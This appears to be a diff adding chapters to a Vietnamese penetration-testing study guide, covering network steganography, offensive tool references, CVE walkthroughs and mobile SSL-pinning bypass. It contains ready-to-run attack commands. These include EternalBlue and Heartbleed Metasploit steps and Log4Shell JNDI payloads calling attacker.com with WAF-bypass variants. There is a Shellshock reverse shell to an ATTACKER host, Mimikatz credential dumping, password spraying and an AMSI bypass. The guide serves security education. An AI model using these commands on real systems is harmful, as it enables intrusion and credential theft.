+
+# === Common CTF Patterns ===
+# Unusual protocols (ICMP with large payload, DNS with long subdomains)
+# Covert channels (data hidden in sequence numbers, TTL values, IP ID)
+# File carving from TCP streams
+# Malware C2 beaconing (periodic connections)
+# Steganography in network (LSB of packet lengths, timing channels)
+```
+
+## 37.3 Network Steganography
+
+```
+Nơi giấu data trong network traffic:
+
+1. ICMP payload (thường padding bytes, ai cũng bỏ qua)
+2. DNS subdomain (encoded data)
+3. TCP ISN (Initial Sequence Number) → encode data
+4. IP ID field (16 bit → encode 2 bytes per packet)
+5. TTL value (encode byte per packet)
+6. TCP Urgent Pointer (khi URG flag = 0, field bị bỏ qua)
+7. IP Options / TCP Options (extensible, rarely inspected)
+8. Packet timing (inter-packet delay encodes bits)
+9. HTTP headers (custom X- headers, Cookie values)
+10. TLS SNI (Server Name Indication)
+
+# Detection: Statistical analysis, entropy measurement, protocol anomaly
+```
+
+---
+
+# PHẦN 38: TOOL REFERENCE DEEP DIVE
+
+## 38.1 Recon Tools
+
+```bash
+# === theHarvester ===
+theHarvester -d target.com -b google,bing,linkedin,twitter -l 500
+theHarvester -d target.com -b all                # Tất cả sources
+# Output: Emails, hostnames, IPs, URLs
+
+# === recon-ng ===
+recon-ng
+[recon-ng] > marketplace search
+[recon-ng] > marketplace install recon/domains-hosts/hackertarget
+[recon-ng] > modules load recon/domains-hosts/hackertarget
+[recon-ng] > options set SOURCE target.com
+[recon-ng] > run
+[recon-ng] > show hosts
+
+# === crt.sh (Certificate Transparency) ===
+curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
+# → List tất cả subdomain từng có SSL cert
+
+# === waybackurls (archived URLs) ===
+echo target.com | waybackurls | sort -u | grep -E '\.(js|json|xml|config|env|sql|bak)'
+
+# === gau (Get All URLs) ===
+echo target.com | gau --threads 5 | sort -u
+```
+
+## 38.2 Enumeration Tools
+
+```bash
+# === rpcclient (SMB/RPC enumeration) ===
+rpcclient -U '' -N 192.168.1.100          # Anonymous
+rpcclient -U 'user%pass' 192.168.1.100
+rpcclient $> enumdomusers                 # List domain users
+rpcclient $> enumdomgroups                # List groups
+rpcclient $> queryuser 0x1f4              # Query user by RID
+rpcclient $> querygroupmem 0x200          # Domain Admins members
+rpcclient $> getdompwinfo                 # Password policy
+rpcclient $> netshareenum                 # Shares
+
+# === kerbrute (Kerberos brute force / user enum) ===
+# User enumeration (no lockout risk!)
+kerbrute userenum -d target.com userlist.txt --dc 192.168.1.1
+# Password spray
+kerbrute passwordspray -d target.com userlist.txt 'Spring2024!'
+# Brute force
+kerbrute bruteuser -d target.com passwords.txt admin
+
+# === nbtscan ===
+nbtscan 192.168.1.0/24
+# Output: IP, NetBIOS name, user, MAC
+
+# === ldapdomaindump ===
+ldapdomaindump -u 'target.com\user' -p 'password' 192.168.1.1
+# Output: HTML + JSON files with users, groups, computers, trusts, policies
+
+# === enum4linux-ng ===
+enum4linux-ng -A 192.168.1.100 -oJ output.json
+# -A: All enumeration, -oJ: JSON output
+# Replaces legacy enum4linux with JSON output and more checks
+
+# === adidnsdump ===
+adidnsdump -u 'target.com\user' -p 'password' 192.168.1.1
+# Dump all DNS records from AD-integrated DNS
+```
+
+## 38.3 Post-Exploitation Tools
+
+```bash
+# === WinPEAS / LinPEAS (Privilege Escalation Enumeration) ===
+# Download
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -o winpeas.exe
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+
+# Run
+.\winpeas.exe              # Windows - tìm tất cả PrivEsc vectors
+chmod +x linpeas.sh && ./linpeas.sh    # Linux
+
+# Output: Color-coded (RED = critical PrivEsc vector)
+# Checks: Permissions, services, scheduled tasks, credentials, kernel exploits
+
+# === Seatbelt (Windows situational awareness) ===
+Seatbelt.exe -group=all
+# Checks: Audit policies, browser data, clipboard, credentials,
+#          env vars, firewall rules, installed products, network info,
+#          PowerShell history, RDP sessions, scheduled tasks, tokens
+
+# === LaZagne (Credential extraction) ===
+# Extract passwords from: browsers, wifi, mail, databases, sysadmin tools, Git
+laZagne.exe all               # Windows
+python3 laZagne.py all        # Linux
+
+# === pspy (Unprivileged process monitoring) ===
+# Monitor processes WITHOUT root
+./pspy64
+# Detect: cron jobs, scripts run by other users, service restarts
+# Useful for finding: writable scripts in cron, credentials in command lines
+
+# === PowerView (AD Enumeration - PowerShell) ===
+Import-Module .\PowerView.ps1
+Get-DomainUser                          # All domain users
+Get-DomainGroup -MemberIdentity "admin" # Groups user is member of
+Get-DomainComputer -Unconstrained       # Unconstrained delegation
+Find-DomainShare -CheckShareAccess      # Accessible shares
+Get-DomainGPO                           # All GPOs
+Find-LocalAdminAccess                   # Machines where current user is local admin
+Get-DomainTrust                         # Domain trusts
+Get-DomainObjectAcl -ResolveGUIDs       # ACLs
+
+# === Mimikatz Full Reference ===
+mimikatz> privilege::debug
+mimikatz> sekurlsa::logonpasswords       # Dump ALL credentials in memory
+mimikatz> sekurlsa::wdigest              # Cleartext passwords (if WDigest enabled)
+mimikatz> sekurlsa::tickets /export      # Export Kerberos tickets
+mimikatz> lsadump::sam                   # SAM database (local accounts)
+mimikatz> lsadump::dcsync /user:krbtgt   # DCSync
+mimikatz> lsadump::lsa /patch            # LSA secrets
+mimikatz> vault::cred                    # Windows Vault credentials
+mimikatz> dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"
+mimikatz> token::elevate                 # Impersonate SYSTEM
+mimikatz> misc::skeleton                 # Skeleton Key injection
+
+# === Rubeus Full Reference ===
+Rubeus.exe kerberoast                    # Kerberoast all SPN accounts
+Rubeus.exe asreproast                    # AS-REP Roast
+Rubeus.exe harvest /interval:30          # Harvest TGTs every 30s
+Rubeus.exe monitor /interval:5           # Monitor for new TGTs
+Rubeus.exe s4u /user:svc /rc4:hash /impersonateuser:admin /msdsspn:cifs/target
+Rubeus.exe ptt /ticket:base64            # Pass-the-Ticket
+Rubeus.exe tgtdeleg                      # Get usable TGT from current session
+Rubeus.exe createnetonly /program:cmd    # Logon session for PtT
+Rubeus.exe hash /password:password       # Calculate NTLM hash
+
+# === searchsploit ===
+searchsploit apache 2.4                  # Search by software + version
+searchsploit -x 12345                    # Examine exploit
+searchsploit -m 12345                    # Copy exploit to current directory
+searchsploit -p 12345                    # Show full path
+searchsploit --nmap output.xml           # Parse nmap XML output
+searchsploit -j apache 2.4              # JSON output
+searchsploit --update                    # Update database
+
+# === Responder Advanced ===
+sudo responder -I eth0 -A               # Analyze mode (no poisoning, just observe)
+sudo responder -I eth0 -v               # Verbose (see all requests)
+sudo responder -I eth0 -f               # Fingerprint (OS detection)
+sudo responder -I eth0 -wrf             # Full attack (WPAD + SMB + relay)
+sudo responder -I eth0 --disable-ess    # Disable ESS (for relay)
+# Logs: /usr/share/responder/logs/
+
+# === evil-winrm Advanced ===
+evil-winrm -i 192.168.1.100 -u admin -p 'pass'
+*Evil-WinRM* PS> upload /local/file.exe C:\temp\file.exe
+*Evil-WinRM* PS> download C:\temp\file.txt /local/
+*Evil-WinRM* PS> Bypass-4MSI                 # AMSI bypass
+*Evil-WinRM* PS> menu                        # Show all commands
+# Load PowerShell scripts:
+evil-winrm -i 192.168.1.100 -u admin -p 'pass' -s /scripts/
+*Evil-WinRM* PS> PowerView.ps1               # Auto-load script
+# Load DLL:
+evil-winrm -i 192.168.1.100 -u admin -p 'pass' -e /dlls/
+```
+
+## 38.4 Scanning Alternatives
+
+```bash
+# === RustScan (fast port scanner → pipes to nmap) ===
+rustscan -a 192.168.1.100 -- -sV -sC
+# Scans all 65535 ports in seconds → passes open ports to nmap
+rustscan -a 192.168.1.100 -p 22,80,443
+rustscan -a 192.168.1.0/24 --batch-size 1024
+
+# === AutoRecon (automated recon pipeline) ===
+autorecon 192.168.1.100
+# Auto-runs: nmap, gobuster, nikto, smbclient, enum4linux, etc.
+# Output: Organized directory structure per target
+autorecon 192.168.1.100 192.168.1.101 192.168.1.102   # Multiple targets
+
+# === OWASP ZAP (Free Burp Suite alternative) ===
+# GUI or CLI
+zap-cli quick-scan http://target.com
+zap-cli active-scan http://target.com
+zap-cli spider http://target.com
+# API: http://localhost:8080/JSON/
+# HUD: Built-in heads-up display in browser
+# Marketplace: Extensions similar to Burp
+```
+
+## 38.5 Wireless Tools
+
+```bash
+# === WiFite2 (Automated wireless attack) ===
+sudo wifite                              # Auto-detect and attack
+sudo wifite --kill                       # Kill interfering processes
+sudo wifite -e "TargetNetwork"           # Target specific SSID
+
+# === airgeddon ===
+sudo bash airgeddon.sh                   # Interactive menu
+# Features: Evil Twin, WPA handshake, PMKID, WPS, DoS
+
+# === bully (WPS brute force) ===
+bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon
+# Brute force WPS PIN → recover WPA password
+# Alternative to reaver, often more reliable
+
+# === Kismet (Wireless IDS/detector) ===
+kismet -c wlan0                          # Start with interface
+# Web UI: http://localhost:2501
+# Detects: Rogue APs, deauth attacks, hidden SSIDs, Bluetooth, etc.
+# Exports: pcap, KML (Google Earth), JSON
+```
+
+---
+
+# PHẦN 39: CVE DEEP DIVES
+
+## 39.1 EternalBlue (MS17-010) - SMBv1 RCE
+
+```bash
+# Năm: 2017 | Impact: Remote Code Execution | WannaCry ransomware
+
+# Nguyên lý:
+# SMBv1 transaction handling có buffer overflow
+# Attacker gửi crafted SMB transaction → overwrite kernel memory
+# → Execute code as SYSTEM (kernel-level exploitation)
+# Không cần authentication!
+
+# Detection
+nmap --script smb-vuln-ms17-010 -p 445 192.168.1.100
+
+# Exploitation (Metasploit)
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST attacker-ip
+exploit
+# → SYSTEM shell
+
+# Affected: Windows XP → Windows Server 2016 (unpatched)
+# Fix: MS17-010 patch, Disable SMBv1
+# Lesson: Patch management critical, SMBv1 should be disabled everywhere
+```
+
+## 39.2 Heartbleed (CVE-2014-0160) - OpenSSL Memory Leak
+
+```bash
+# Năm: 2014 | Impact: Memory disclosure (passwords, private keys)
+
+# Nguyên lý:
+# TLS Heartbeat extension: Client gửi "ping" với payload + length
+# Server trả lại payload theo length chỉ định
+# BUG: Server KHÔNG CHECK length thực tế vs payload thực tế
+# Client gửi: payload=1 byte, length=65535
+# Server trả: 1 byte payload + 65534 bytes TỪ MEMORY!
+# → Leak: passwords, session keys, private keys
+
+# Request (simplified):
+# "Send back 65535 bytes of this 1-byte payload"
+# Server reads: 1 byte of payload + 65534 bytes of adjacent memory
+
+# Detection
+nmap --script ssl-heartbleed -p 443 target.com
+
+# Exploitation
+use auxiliary/scanner/ssl/openssl_heartbleed
+set RHOSTS target.com
+set VERBOSE true
+run
+# → Dump memory chunks, tìm credentials/keys
+
+# Fix: Update OpenSSL ≥ 1.0.1g, revoke + reissue certificates
+```
+
+## 39.3 Log4Shell (CVE-2021-44228) - Log4j RCE
+
+```bash
+# Năm: 2021 | Impact: Remote Code Execution | CVSS 10.0
+
+# Nguyên lý:
+# Log4j (Java logging library) hỗ trợ JNDI lookup trong log messages
+# Attacker gửi: ${jndi:ldap://attacker.com/evil}
+# Server LOG chuỗi này → Log4j resolve JNDI
+# → Kết nối đến attacker LDAP → download Java class → execute!
+
+# Attack chain:
+# 1. Attacker inject payload vào bất kỳ logged field:
+#    User-Agent: ${jndi:ldap://attacker:1389/exploit}
+#    X-Api-Version: ${jndi:ldap://attacker:1389/exploit}
+#    Username field: ${jndi:ldap://attacker:1389/exploit}
+# 2. Server logs the field → Log4j processes JNDI
+# 3. Server connects to attacker LDAP
+# 4. LDAP returns reference to Java class
+# 5. Server downloads and executes class → RCE
+
+# Detection
+# Scan headers/params with payload
+curl -H 'X-Api-Version: ${jndi:ldap://CALLBACK_IP/test}' http://target.com
+# Monitor for callback on CALLBACK_IP
+
+# WAF bypass variants:
+${jndi:ldap://...}
+${j${::-n}di:ldap://...}
+${${lower:j}ndi:ldap://...}
+${${env:NaN:-j}ndi${env:NaN:-:}ldap://...}
+
+# Fix: Update Log4j ≥ 2.17.0
+```
+
+## 39.4 Shellshock (CVE-2014-6271) - Bash RCE
+
+```bash
+# Năm: 2014 | Impact: Remote Code Execution
+
+# Nguyên lý:
+# Bash cho phép define function trong environment variable
+# BUG: Bash execute code SAU function definition!
+# env x='() { :; }; echo VULNERABLE' bash -c "echo test"
+# Nếu in "VULNERABLE" → bash bị lỗi
+
+# Exploitation (via CGI):
+# Web server dùng CGI → pass HTTP headers as env vars → Bash processes them
+curl -A '() { :; }; /bin/bash -c "cat /etc/passwd"' http://target.com/cgi-bin/test.cgi
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1' http://target.com/cgi-bin/test.cgi
+
+# Nmap detection
+nmap --script http-shellshock --script-args uri=/cgi-bin/test.cgi -p 80 target.com
+
+# Fix: Update Bash
+```
+
+## 39.5 ProxyLogon (CVE-2021-26855) & ProxyShell
+
+```bash
+# Năm: 2021 | Impact: Exchange Server RCE (pre-auth!)
+
+# ProxyLogon chain:
+# CVE-2021-26855: SSRF → authenticate as any user
+# CVE-2021-27065: Arbitrary file write → webshell
+
+# ProxyShell chain:
+# CVE-2021-34473: Pre-auth path confusion → access backend
+# CVE-2021-34523: Privilege escalation → SYSTEM
+# CVE-2021-31207: Post-auth RCE → webshell
+
+# Detection
+nmap --script http-vuln-cve2021-26855 -p 443 target.com
+
+# Chỉ check version:
+curl -k https://target.com/owa/auth/logon.aspx | grep "version"
+
+# Fix: Patch Exchange, enable Extended Protection
+```
+
+---
+
+# PHẦN 40: MOBILE APP NETWORK TESTING
+
+## 40.1 Android Proxy Setup Chi tiết
+
+```bash
+# === Android < 7 (Nougat) ===
+# Cài certificate qua Settings → Security → Install from storage
+# Done - app trust user certificates
+
+# === Android 7+ (Network Security Config) ===
+# Apps NO LONGER trust user-installed certificates by default!
+
+# Method 1: Modify APK
+apktool d target.apk -o target_dir
+# Edit: target_dir/res/xml/network_security_config.xml
+# Add:
+# <network-security-config>
+#   <base-config cleartextTrafficPermitted="true">
+#     <trust-anchors>
+#       <certificates src="system" />
+#       <certificates src="user" />    ← ADD THIS
+#     </trust-anchors>
+#   </base-config>
+# </network-security-config>
+apktool b target_dir -o target_patched.apk
+# Sign APK
+keytool -genkey -v -keystore my.keystore -alias alias -keyalg RSA -keysize 2048
+apksigner sign --ks my.keystore target_patched.apk
+adb install target_patched.apk
+
+# Method 2: Magisk Module (Rooted device)
+# Install MagiskTrustUserCerts module
+# → Moves user certs to system trust store on boot
+
+# Method 3: Objection (Frida-based, no root needed)
+objection -g com.target.app explore
+> android sslpinning disable
+```
+
+## 40.2 Certificate Pinning Bypass
+
+```bash
+# === Frida Script ===
+# Universal SSL Pinning Bypass
+frida -U -f com.target.app -l ssl_bypass.js --no-pause
+
+# ssl_bypass.js (simplified):
+# Java.perform(function() {
+#   var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
+#   var SSLContext = Java.use('javax.net.ssl.SSLContext');
+#   // Override checkServerTrusted to accept all certificates
+#   // Override getAcceptedIssuers to return empty array
+# });
+
+# === Objection (Easier) ===
+pip3 install objection
+objection -g com.target.app explore
+> android sslpinning disable
+# Works for most apps immediately
+
+# === iOS (Jailbroken) ===
+# SSL Kill Switch 2 (Cydia tweak)
+# Or Frida:
+frida -U -f com.target.app -l ios_ssl_bypass.js
+
+# === Common pinning implementations ===
+# OkHttp CertificatePinner
+# TrustKit
+# Custom X509TrustManager
+# Network Security Config (Android)
+# AFNetworking (iOS)
+# Each needs specific Frida hook
+```
+
+## 40.3 iOS Network Testing
+
+```bash
+# Setup proxy (non-jailbroken)
+# Settings → Wi-Fi → HTTP Proxy → Manual
+# Server: Burp/Charles IP, Port: 8080
+# Install CA cert: Visit http://burp/ in Safari → Install Profile
+# Settings → General → About → Certificate Trust Settings → Enable
+
+# Traffic analysis
+# Burp Suite / Charles Proxy intercept HTTPS traffic
+# Check for: hardcoded API keys, insecure endpoints, sensitive data in logs
+
+# Jailbroken device tools
+# SSL Kill Switch 2
+# Cycript (runtime manipulation)
+# Frida
+# Objection
+```
+
+---
 
 > **Lời khuyên cuối**: Networking là nền tảng của mọi thứ trong security. Đừng vội nhảy vào tools mà chưa hiểu fundamentals. Khi bạn hiểu packet đi từ đâu đến đâu, qua những gì, bạn sẽ tự biết cách exploit và defend. Hãy dựng lab và thực hành. Đọc xong phần nào → làm lab phần đó. Không có shortcut.
